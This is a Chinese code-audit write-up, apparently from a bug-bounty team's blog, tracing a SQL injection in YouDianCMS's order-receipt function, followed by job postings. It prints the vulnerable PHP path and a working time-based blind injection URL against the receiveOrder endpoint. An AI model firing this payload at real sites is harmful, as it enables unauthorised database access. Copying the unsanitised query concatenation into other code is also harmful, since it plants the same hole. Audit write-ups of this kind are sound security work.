> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/28NDtNEm4A-vMA5Aau_RnA)

_**声明**_

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测以及文章作者不为此承担任何责任。  
雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

_**No.1  
**_

_**前言**_

YouDianCMS 是基于 ThinkPHP 框架开发的 PC + 手机 + 微官网 + 小程序 + APP 五站合一企业网站管理系统。

_**_**No.2**_**_

_**正文**_

基于 ThinkPHP 开发路由有两种  

**GET 型路由**

```
htttp://localhost/?m=moudle&c=controller&a=action&id=xx
```

**PathInfo 型路由**

```
`htttp://localhost/index.php/Member/User/Login/Var/Value`
```

YouDianCMS 的功能模块都在 /App/Lib/Action/ 目录下。对应四个子目录：Admin，Home，Member，Wap。Module 为模块类，Action 为类方法。  

漏洞触发点  
App/Lib/Action/Member/MobileAction.class.php**  
receiveOrder 方法**

```
function receiveOrder(){
    $m = D('Admin/Order');
    $p['MemberID'] = session('MemberID');
    $p['MemberName'] = session('MemberName');
    $b = $m->confirmReceipt($_REQUEST['id'], $p);
    $this->ajaxReturn(null, '确认收货成功' , 1);
  }
```

实例化模型 Admin/Order

接着 MemebrID/MemberName 赋值给 SESSION

id 传入 **confirmReceipt 方法**中。

```
function confirmReceipt($orderid, $p=array()){
   $m = D('Admin/OrderLog');
   $data['OrderID'] = intval($orderid);
   $data['OrderLogType'] = 6;
   if( isset( $p['MemberName']) ){ //会员自己操作
      $data['Operator'] = $p['MemberName'];
   }elseif(isset( $p['AdminName']) ){ //有管理员操作
      $data['Operator'] = $p['AdminName'];
   }
   if( isset($p['OrderLogRemark'])){
      $data['OrderLogRemark'] = $p['OrderLogRemark'];
   }
   $data['OrderLogTime'] = date('Y-m-d H:i:s');
   $result = $m->add($data);
   if($result){
      //1. 设置订单状态
      $this->setOrderStatus($orderid, 6, $p);
      //2. 确认收货以后，赠送积分
      $mp = D('Admin/Point');
      $b = $mp->orderGivePoint($orderid);
      //3. 三级分销，计算返利
      $b = distribute_rebate($orderid);
      //4. 自动成为分销商（必须放在最后）
      auto_set_distributor($orderid);
   }
}
```

实例化模型 Admin/OrderLog

对 **OrderID** 进行了强制整型转换

接着对订单进行记录并判断

跟进订单状态函数 **setOrderStatus**

```
function setOrderStatus($orderid, $status, $p=array()){
   return $this->setOrder($orderid, $status, false, false, $p);
}
```

未发现可控的点

再跟进 **orderGivePoint** 函数

```
function orderGivePoint($OrderID){
   $m = D('Admin/Order');
   $where['OrderID'] = intval($OrderID);
   var_dump($where);
   $order = $m->where($where)->field('MemberID,OrderPoint')->find();
   if( !empty($order) && $order['OrderPoint']>0){
      $data['MemberID'] = $order['MemberID'];
      $data['OrderID'] = intval($OrderID);
      $data['PointValue'] = $order['OrderPoint'];
      $data['PointType'] = 1;
      $data['PointTime'] = date('Y-m-d H:i:s');
      $result = $this->add($data);
      return $result;
   }
   return false;
}
```

可控点 **OrderID**，被 **intval** 函数强制整型转换

再跟进函数 **distribute_rebate**

```
function distribute_rebate($OrderID){
  $m = D('Admin/Order');
  $order = $m->where("OrderID=$OrderID")->field('MemberID,OrderNumber')->find();
  $MemberID = $order['MemberID'];
  $OrderNumber = $order['OrderNumber'];
  //判断当前用户是否有分销功能
  $canDistribute = can_distribute($MemberID);
  if(!$canDistribute) return false;
  
  //==计算总分成佣金==
  $Commission = 0; //总分成佣金
  $DistributeMode = $GLOBALS['Config']['DistributeMode'];
  if($DistributeMode==1){ //1:按商品设置的分成金额      
    $mi = D('Admin/Info');
    $Commission = $mi->getOrderCommission($OrderID);
  }else{ //2:按订单设置的分成比例
    //获取当前订单消费总额
    $TotalOrderPrice = $m->getTotalOrderPrice($MemberID, $OrderID);
    $OrderRate = doubleval($GLOBALS['Config']['OrderRate'])/100.0;
    $Commission = $TotalOrderPrice * $OrderRate;
  }
  if( $Commission<=0 ) return false;
  
  //==开始返利==
  $CashTime = date('Y-m-d H:i:s');
  $cash = array(); //返利数据
  //1.自己返佣
  $memberToUpgrade = array(); //记录可能会升级的分销商
  $BuyerRate = doubleval($GLOBALS['Config']['BuyerRate'])/100.0;
  if($BuyerRate>0){
    $money = round($Commission * $BuyerRate, 2);
    $cash[] = array(
      'MemberID'=>$MemberID,
      'CashQuantity'=>$money,
      'CashType'=>5, //5:表示分销佣金
      'CashStatus'=>1,
      'CashTime'=>$CashTime,
      'OrderID'=>$OrderID, //分佣时记录对应的订单ID
      'CashRemark'=>"购买者自返佣，订单号：{$OrderNumber}",
    );
    $memberToUpgrade[] = $MemberID;
  }
  //2.下线返佣
  $md = D('Admin/DistributorLevel');
  $mm = D('Admin/Member');
  $upline = $mm->getUpline($MemberID, $GLOBALS['Config']['ReturnGrade']);
  foreach ($upline as $level=>$v){
    $rate = $md->getCommissionRate($v['DistributorLevelID'], $level);
    //参与返利的上线一定正常状态，否则不返利
    if($v['IsCheck']==1 && $v['IsLock']==0 && $rate>0){
      $money = $Commission * $rate;
      $memberToUpgrade[] = $v['MemberID'];
      $cash[] = array(
        'MemberID'=>$v['MemberID'],
        'CashQuantity'=>$money,
        'CashType'=>5,  //5:表示分销佣金
        'CashStatus'=>1,
        'CashTime'=>$CashTime,
        'OrderID'=>$OrderID, //分佣时记录对应的订单ID
        'CashRemark'=>"订单号：{$OrderNumber}",
      );
      //模板变量
      $var['CashQuantity'] = $money;
      $var['OrderNumber'] = $OrderNumber;
      $var['CashTime'] =  $CashTime;
      $var['MemberName'] =  $v['MemberName'];
      $var['MemberEmail'] =  $v['MemberEmail'];
      $var['MemberMobile'] =  $v['MemberMobile'];
      distribute_notify($var);
    }
  }
  //3. 批量插入数据
  if(count($cash)>0){
    $mc = D('Admin/Cash');
    $result = $mc->addAll($cash); //批量插入返利数据
    if($result){
      //4.相关会员，升级分销商等级
      $md->upgradeDistributorLevel($memberToUpgrade);
    }
  }
}
```

**OrderID** 未处理进入拼接

```
$order = $m->where("OrderID=$OrderID")->field('MemberID,OrderNumber')->find();
```

由于是 ThinkPHP，此时它的路由为

```
http://youdiancms.com/index.php/Member/Moblie/ReceiveOrder/id
```

debug 调试

```
$order = $m->where("OrderID=$OrderID")->field('MemberID,OrderNumber')->find();
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUibOh0HVJNHr4rlkTxn3wQOsMBvmTfBBtwZn4Dr0LQFk3FDXU74jJsO3wZebJ1U9sc6icFvia8a4qQw/640?wx_fmt=png)

构造注入 延时 5 秒

```
http://youdiancms.io:8888/index.php/Member/Mobile/receiveOrder/id/1 AND (SELECT x FROM  (SELECT(SLEEP(5)))x)
```

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUibOh0HVJNHr4rlkTxn3wQO1ALmYSQKhRUguAnJYGCjNPRRd4V5Hsiacf0wAic31giaZZgvOQNGQVH8w/640?wx_fmt=png)

SQLMAP 下结果

![](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUibOh0HVJNHr4rlkTxn3wQO6ZBffpVhXJXotDVNU8duOPHXqgqOZUX3YAmddAw7CjUAHxOHtJF4CA/640?wx_fmt=png)

_**招聘启事**_

安恒雷神众测 SRC 运营（实习生）  
————————  
【职责描述】  
1.  负责 SRC 的微博、微信公众号等线上新媒体的运营工作，保持用户活跃度，提高站点访问量；  
2.  负责白帽子提交漏洞的漏洞审核、Rank 评级、漏洞修复处理等相关沟通工作，促进审核人员与白帽子之间友好协作沟通；  
3.  参与策划、组织和落实针对白帽子的线下活动，如沙龙、发布会、技术交流论坛等；  
4.  积极参与雷神众测的品牌推广工作，协助技术人员输出优质的技术文章；  
5.  积极参与公司媒体、行业内相关媒体及其他市场资源的工作沟通工作。  
【任职要求】   
 1.  责任心强，性格活泼，具备良好的人际交往能力；  
 2.  对网络安全感兴趣，对行业有基本了解；  
 3.  良好的文案写作能力和活动组织协调能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

设计师（实习生）

————————

【职位描述】  
负责设计公司日常宣传图片、软文等与设计相关工作，负责产品品牌设计。  
【职位要求】  
1、从事平面设计相关工作 1 年以上，熟悉印刷工艺；具有敏锐的观察力及审美能力，及优异的创意设计能力；有 VI 设计、广告设计、画册设计等专长；  
2、有良好的美术功底，审美能力和创意，色彩感强；精通 photoshop/illustrator/coreldrew / 等设计制作软件；  
3、有品牌传播、产品设计或新媒体视觉工作经历；  
【关于岗位的其他信息】  
企业名称：杭州安恒信息技术股份有限公司  
办公地点：杭州市滨江区安恒大厦 19 楼  
学历要求：本科及以上  
工作年限：1 年及以上，条件优秀者可放宽

简历投递至 

bountyteam@dbappsecurity.com.cn

安全招聘  
————————  
公司：安恒信息  
岗位：Web 安全 安全研究员  
部门：战略支援部  
薪资：13-30K  
工作年限：1 年 +  
工作地点：杭州（总部）、广州、成都、上海、北京

工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…  
【岗位职责】  
1. 定期面向部门、全公司技术分享;  
2. 前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；  
3. 负责完成部门渗透测试、红蓝对抗业务;  
4. 负责自动化平台建设  
5. 负责针对常见 WAF 产品规则进行测试并落地 bypass 方案  
【岗位要求】  
1. 至少 1 年安全领域工作经验；  
2. 熟悉 HTTP 协议相关技术  
3. 拥有大型产品、CMS、厂商漏洞挖掘案例；  
4. 熟练掌握 php、java、asp.net 代码审计基础（一种或多种）  
5. 精通 Web Fuzz 模糊测试漏洞挖掘技术  
6. 精通 OWASP TOP 10 安全漏洞原理并熟悉漏洞利用方法  
7. 有过独立分析漏洞的经验，熟悉各种 Web 调试技巧  
8. 熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）  
【加分项】  
1. 具备良好的英语文档阅读能力；  
2. 曾参加过技术沙龙担任嘉宾进行技术分享；  
3. 具有 CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP 等安全相关资质者；  
4. 具有大型 SRC 漏洞提交经验、获得年度表彰、大型 CTF 夺得名次者；  
5. 开发过安全相关的开源项目；  
6. 具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；  
7. 个人技术博客；  
8. 在优质社区投稿过文章；

岗位：安全红队武器自动化工程师  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 熟练使用 Python、java、c/c++ 等至少一门语言作为主要开发语言；  
2. 熟练使用 Django、flask 等常用 web 开发框架、以及熟练使用 mysql、mongoDB、redis 等数据存储方案；  
3: 熟悉域安全以及内网横向渗透、常见 web 等漏洞原理；  
4. 对安全技术有浓厚的兴趣及热情，有主观研究和学习的动力；  
5. 具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

岗位：红队武器化 Golang 开发工程师  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 掌握 C/C++/Java/Go/Python/JavaScript 等至少一门语言作为主要开发语言；  
2. 熟练使用 Gin、Beego、Echo 等常用 web 开发框架、熟悉 MySQL、Redis、MongoDB 等主流数据库结构的设计, 有独立部署调优经验；  
3. 了解 docker，能进行简单的项目部署；  
3. 熟悉常见 web 漏洞原理，并能写出对应的利用工具；  
4. 熟悉 TCP/IP 协议的基本运作原理；  
5. 对安全技术与开发技术有浓厚的兴趣及热情，有主观研究和学习的动力，具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式、消息队列等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。  
简历投递至 

bountyteam@dbappsecurity.com.cn

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JUibOh0HVJNHr4rlkTxn3wQOxyjFSOy2HlbTp3V0qq2zRnCSUfUBlyKRHTWZxfwia1k3MUWgAFle4YQ/640?wx_fmt=jpeg)

专注渗透测试技术

全球最新网络攻击技术

END

![](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JX5icUxKxKKCb9FU6ZFOtlkcGTmicaJW9kEOQuGzEqjrEwGK1RCH3ez0ibytXGic3uHOoUjNcUic2UlibQA/640?wx_fmt=jpeg)